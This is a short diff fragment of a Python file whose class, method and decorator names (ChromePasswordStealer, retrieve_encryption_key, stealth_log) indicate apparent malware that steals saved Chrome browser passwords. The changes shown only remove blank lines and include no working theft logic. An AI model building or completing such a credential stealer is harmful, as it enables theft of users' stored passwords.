@@ -37,7 +37,6 @@ def database_check(func):
     return wrapper
 
 class ChromePasswordRetriever:
-    
     @stealth_log
     @encrypt_check
     def retrieve_encryption_key(self):
@@ -78,7 +77,6 @@ class ChromePasswordRetriever:
         print("=" * 70)
 
 class ChromePasswordStealer:
-    
     def __init__(self):
         self.retriever = ChromePasswordRetriever()
 
